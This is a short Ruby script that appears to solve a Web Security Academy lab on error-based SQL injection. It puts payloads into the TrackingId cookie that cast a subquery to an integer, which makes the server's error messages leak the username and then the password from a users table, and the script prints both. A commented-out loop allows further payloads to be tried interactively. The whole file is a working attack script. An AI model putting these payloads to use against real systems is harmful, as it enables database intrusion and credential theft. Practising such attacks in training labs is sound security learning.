require 'http'
require 'nokogiri'


url = "https://0a40008804d8b4608876157f00080087.web-security-academy.net/"
client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"
)

# Outputting username in the error message
payload1 = URI.encode_uri_component(" AND 1=CAST((SELECT username FROM users LIMIT 1) as int)-- -")
resp = client.cookies(
	:session=>"TNzqXlBBsdg8O4YqMm5pXfElOK7jVzQN",
	:TrackingId=>"a'#{payload1}" 
	).get url
resph = Nokogiri.parse(resp.body.to_s)
resph = resph.search(:tag,"h4").text.split
resph.each {|n| puts 'User administrator found' if n.include? "administrator"}

# Outputting password in the error message
payload2 = URI.encode_uri_component(" AND 1=CAST((SELECT password FROM users LIMIT 1) as int)-- -")
resp = client.cookies(
	:session=>"TNzqXlBBsdg8O4YqMm5pXfElOK7jVzQN",
	:TrackingId=>"a'#{payload2}" 
	).get url
resph = Nokogiri.parse(resp.body.to_s)
resph = resph.search(:tag,"h4").text.split
resph.each {|n| puts "Password: #{n}" if n.length>18}

=begin
until payload=='exit'
	print "Enter payload : SjbW8O2amzXvT6YT"
	payload = URI.encode_uri_component(gets.chomp)
	resp = client.cookies(
			:session=>"TNzqXlBBsdg8O4YqMm5pXfElOK7jVzQN",
			:TrackingId=>"SjbW8O2amzXvT6YT#{payload}" 
			).get url
	status = resp.code
	if status == 200
		puts '----->true'
	elsif status == 500
		resph = Nokogiri.parse(resp.body.to_s)
		resph = resph.search(:tag,"h4").text
		puts "Verbose Error [#{resph}]"	
	end
end
=end
 
